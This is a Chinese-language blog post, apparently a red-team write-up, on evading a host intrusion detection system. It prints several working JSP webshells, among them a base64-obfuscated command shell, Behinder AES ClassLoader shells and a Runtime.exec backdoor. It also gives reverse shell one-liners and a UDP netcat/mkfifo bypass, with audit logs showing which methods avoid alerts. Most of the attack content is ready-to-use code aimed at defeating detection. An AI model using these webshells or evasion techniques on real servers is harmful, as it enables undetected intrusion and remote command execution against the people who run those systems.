class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"sun.misc.BASE64Encoder"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"sun.misc.BASE64Decoder"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=POST ACTION=<span class="string">'#'</span>&gt;</span><br><span class="line">    &lt;INPUT name=<span class="string">'q'</span> type=text&gt;</span><br><span class="line">    &lt;INPUT type=submit value=<span class="string">'Fly'</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getPicture</span><span class="params">(String str)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        BASE64Decoder decoder = <span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">        BASE64Encoder encoder = <span class="keyword">new</span> BASE64Encoder();</span><br><span class="line">        String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">        <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"Y21k"</span>)));<span class="comment">// cmd</span></span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"L2M="</span>)));<span class="comment">// /c</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"L2Jpbi9iYXNo"</span>)));<span class="comment">// /bin/bash</span></span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"LWM="</span>)));<span class="comment">//	-c</span></span><br><span class="line">        &#125;</span><br><span class="line">        list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(str)));</span><br><span class="line">        Class PB = Class.forName(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVy"</span>))); <span class="comment">//java.lang.ProcessBuilder</span></span><br><span class="line">        Process s = (Process) PB.getMethod(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"c3RhcnQ="</span>))).invoke(PB.getDeclaredConstructors()[<span class="number">0</span>].newInstance(list)); <span class="comment">//start</span></span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(s.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        result = sc.hasNext() ? sc.next() : result;</span><br><span class="line">        sc.close();</span><br><span class="line">        <span class="keyword">return</span> encoder.encode(result.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String name =<span class="string">"Input Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    <span class="keyword">if</span>(query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        name = getPicture(query);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%= name %&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="冰蝎jsp"><a href="#冰蝎jsp" class="headerlink" title="冰蝎jsp"></a>冰蝎jsp</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;</span><br><span class="line">&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;</span><br><span class="line">&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">"pass"</span>)!=<span class="keyword">null</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	String k=(<span class="string">""</span>+UUID.randomUUID()).replace(<span class="string">"-"</span>,<span class="string">""</span>).substring(<span class="number">16</span>);</span><br><span class="line">	session.putValue(<span class="string">"u"</span>,k);</span><br><span class="line">	out.print(k);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	Cipher c=Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">	c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec((session.getValue(<span class="string">"u"</span>)+<span class="string">""</span>).getBytes(),<span class="string">"AES"</span>));</span><br><span class="line">	<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="冰蝎jspx"><a href="#冰蝎jspx" class="headerlink" title="冰蝎jspx"></a>冰蝎jspx</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:root xmlns:jsp&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;JSP&#x2F;Page&quot; version&#x3D;&quot;1.2&quot;&gt;</span><br><span class="line">&lt;jsp:directive.page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;&#x2F;&gt;</span><br><span class="line">&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;&#x2F;jsp:declaration&gt;&lt;jsp:scriptlet&gt;if(request.getParameter(&quot;pass&quot;)!&#x3D;null)&#123;String k&#x3D;(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c&#x3D;Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;&#x2F;jsp:scriptlet&gt;&lt;&#x2F;jsp:root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对于样本的尝试也很简单，在上传的时候发现有的告警有的没有告警，最后经过尝试发现ProcessBuilder()+jsp会触发告警，没什么好说的，这里主要是记录一下这几个免杀马。</p>
+<h3 id="RCE-1"><a href="#RCE-1" class="headerlink" title="RCE"></a>RCE</h3><p>在是RCE的时候使用冰蝎连接，发现HIDS未产生告警，但是使用小马2、小马3直接执行命令能够产生告警，一开始猜测是因为冰蝎使用的是ClassLoader加载类进行执行代码，所以就跟了一下ClassLoader机制。</p>
+<h4 id="Classloader"><a href="#Classloader" class="headerlink" title="Classloader"></a>Classloader</h4><p>Classloader是Java的类加载机制，能够加载将Java文件编译成的class类。</p>
+<p>首先创建一个弹calc.exe的processbuilddemo.java文件：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">processbuilddemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">processbuilddemo</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello, World!"</span>);</span><br><span class="line">        <span class="keyword">byte</span> exec1[] = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>&#125;;</span><br><span class="line">        System.out.println(exec1);</span><br><span class="line">        List&lt;String&gt; command = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        command.add( <span class="string">"cmd.exe"</span> );</span><br><span class="line">        command.add( <span class="string">"/c"</span> );</span><br><span class="line">        command.add( <span class="string">"calc.exe"</span> );</span><br><span class="line">        ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder( ( command ) );</span><br><span class="line">        Process process = pb.start();</span><br><span class="line">        InputStream inputStream = process.getInputStream();</span><br><span class="line">        InputStream errorStream = process.getErrorStream();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令进行编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d . processbuilddemo.java</span><br></pre></td></tr></table></figure>
+
+<p>此时会生成一个class类型二进制文件</p>
+<p><img src="HIDS.assets/image-20200326175840195.png" alt="image-20200326175840195"></p>
+<p>然后可以使用Classloader加载processbuilddemo类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PBDemo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"d:/java"</span>);</span><br><span class="line">        URI uri = file.toURI();</span><br><span class="line">        URL url = uri.toURL();</span><br><span class="line"></span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        System.out.println(classLoader.getParent());</span><br><span class="line">        Class clazz = classLoader.loadClass(<span class="string">"test.processbuilddemo"</span>); <span class="comment">//加载processbuilddemo类</span></span><br><span class="line">        clazz.newInstance();	<span class="comment">//实例化processbuilddemo类</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行之后calc.exe被执行</p>
+<p><img src="HIDS.assets/image-20200326180319401.png" alt="image-20200326180319401"></p>
+<p>更多的内容可参考<a href="https://www.bilibili.com/video/BV1vJ41177cw?p=10" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1vJ41177cw?p=10</a></p>
+<h4 id="getRuntime-和buildprocess"><a href="#getRuntime-和buildprocess" class="headerlink" title="getRuntime()和buildprocess()"></a>getRuntime()和buildprocess()</h4><p>虽然搞明白了classloader的使用，但是并没有起到什么作用，因为后来看到网上一个文章写到冰蝎使用的是Runtime.getRuntime().exec(）方法，然后使用Runtime.getRuntime().exec(）小马执行命令发现未触发告警。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=GBK"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">        &lt;title&gt;Ò»¾ä»°Ä¾Âí&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;%</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"admin"</span>.equals(request.getParameter(<span class="string">"pwd"</span>))) &#123;</span><br><span class="line">            java.io.InputStream input = Runtime.getRuntime().exec(request.getParameter(<span class="string">"cmd"</span>)).getInputStream();</span><br><span class="line">            <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4092</span>];</span><br><span class="line">            out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">            <span class="keyword">while</span> ((len = input.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.println(<span class="keyword">new</span> String(bytes, <span class="string">"GBK"</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    %&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看audit日志发现：</p>
+<p>runtime方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">type&#x3D;EXECVE msg&#x3D;audit(1584934227.310:403872): argc&#x3D;1 a0&#x3D;&quot;ifconfig&quot;</span><br><span class="line">&#x2F;&#x2F;执行单个命令时（比如whoami，ifconfig），使用runtime只会产生一条日志</span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(1584934299.349:403960): argc&#x3D;1 a0&#x3D;&quot;ls&quot;</span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(1584934310.195:403963): argc&#x3D;2 a0&#x3D;&quot;cat&quot; a1&#x3D;&quot;version.sh&quot;</span><br><span class="line">为什么cd ..&#x2F;能触发</span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(1584934362.586:404009): argc&#x3D;3 a0&#x3D;&quot;&#x2F;bin&#x2F;sh&quot; a1&#x3D;&quot;&#x2F;bin&#x2F;cd&quot; a2&#x3D;&quot;..&#x2F;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>processbuild方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type&#x3D;EXECVE msg&#x3D;audit(1584934434.580:404060): argc&#x3D;3 a0&#x3D;&quot;&#x2F;bin&#x2F;bash&quot; a1&#x3D;&quot;-c&quot; a2&#x3D;&quot;whoami&quot;</span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(1584934434.582:404061): argc&#x3D;1 a0&#x3D;&quot;whoami&quot;</span><br><span class="line">这种方式会产生两条日志</span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(1584934612.434:404205): argc&#x3D;3 a0&#x3D;&quot;&#x2F;bin&#x2F;bash&quot; a1&#x3D;&quot;-c&quot; a2&#x3D;&quot;ifconfig&quot;</span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(1584934612.437:404206): argc&#x3D;1 a0&#x3D;&quot;ifconfig&quot;</span><br></pre></td></tr></table></figure>
+
+<p>原来是因为使用processbuild的小马使用了/bin/bash的路径，如果去掉则能够饶过，但是部分命令会报错。先知上有个文章分析这两种方式的不同方式，写的很详细。<a href="https://xz.aliyun.com/t/6503" target="_blank" rel="noopener">https://xz.aliyun.com/t/6503</a></p>
+<h3 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>常规的反弹shell:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="HIDS.assets/image-20200326164235284.png" alt="image-20200326164235284"></p>
+<p>bash反弹shell的原理链接：<a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a></p>
+<p>测试后发现检测的是TCP连接，然后找到了一个使用nc进行udp连接的方式进行绕过：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">被控主机：</span><br><span class="line">cp /bin/bash /bin/bshell //这里是为了lsof看起来方便，所以改名成了bshell</span><br><span class="line">mkfifo test</span><br><span class="line">nc -u 127.0.0.1 1234 &lt; test | &#123;  bshell; &#125; &gt; test</span><br><span class="line"></span><br><span class="line">控制端：</span><br><span class="line">nc -l -p 1234 -v -u</span><br></pre></td></tr></table></figure>
+
+<p>这里执行之后会产生一个/dev/pts/0的虚拟终端和一个UDP的连接</p>
+<p><img src="HIDS.assets/image-20200325151223244.png" alt="image-20200325151223244"></p>
+<p><img src="HIDS.assets/image-20200325153100396.png" alt="image-20200325153100396"></p>
+<h4 id="dev-tty和dev-pts"><a href="#dev-tty和dev-pts" class="headerlink" title="dev/tty和dev/pts"></a>dev/tty和dev/pts</h4><p>概念：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tty一词源于Teletypes，或者teletypewriters，原来指的是电传打字机，是通过串行线用打印机键盘通过阅读和发送信息的东西，后来这东西被键盘与显示器取代，所以现在叫终端比较合适。 </span><br><span class="line"></span><br><span class="line">pts(pseudo-terminal slave)是pty的实现方法，与ptmx(pseudo-terminal master)配合使用实现pty。 </span><br><span class="line">终端是一种字符型设备，它有多种类型，通常使用tty来简称各种类型的终端设备。</span><br></pre></td></tr></table></figure>
+
+<p>/dev/tty是什么？<br>tty设备包括虚拟控制台，串口以及伪终端设备。/dev/tty代表当前tty设备，在当前的终端中输入 echo “hello” &gt; /dev/tty ，都会直接显示在当前的终端中。 可以使用tty查看当前tty</p>
+<p><img src="HIDS.assets/image-20200325112201550.png" alt="image-20200325112201550"></p>
+<p>可以看到tty执行之后输出的内容为/dev/pts/0，换一个终端（这里的终端全部都是ssh终端）执行的结果为：</p>
+<p><img src="HIDS.assets/image-20200325112242870.png" alt="image-20200325112242870"></p>
+<p>也就是说每一个终端都有不同的文件来代替，同时，既然一切皆文件，我在/dev/pts/0的终端中输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hello&quot; &gt; &#x2F;dev&#x2F;pts&#x2F;3</span><br></pre></td></tr></table></figure>
+
+<p>是可以看到pts/3会接收到了hello数据</p>
+<p><img src="HIDS.assets/image-20200325112506075.png" alt="image-20200325112506075"></p>
+<p>使用bash -i &gt;&amp; /dev/tcp/1.1.1.1/1234 0&gt;&amp;1反弹shell时不会产生PTS，只会产生类似于下面格式的TCP连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshd  29282  root  3u   IPv4      7635990   0t0    TCP 1.1.1.1:55555-&gt;2.2.2.2:1111</span><br></pre></td></tr></table></figure>
+
+<p><img src="HIDS.assets/image-20200325133710822.png" alt="image-20200325133710822"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/12-18-Hostapd+DNSMASQ%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/">Hostapd+DNSMASQ创建钓鱼热点</a>
+            
+            
+            <a class="next" rel="next" href="/2020/12-18-Exchange+NTLMRelay/">Exchange+NTLMRelay</a>
+            
+        </section>
+	
+		<section id="comments" class="comments">
+		  <style>
+			.comments{margin:30px;padding:10px;background:#fff}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+		  </style>
+		  <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
+      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+		</section>
+	
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
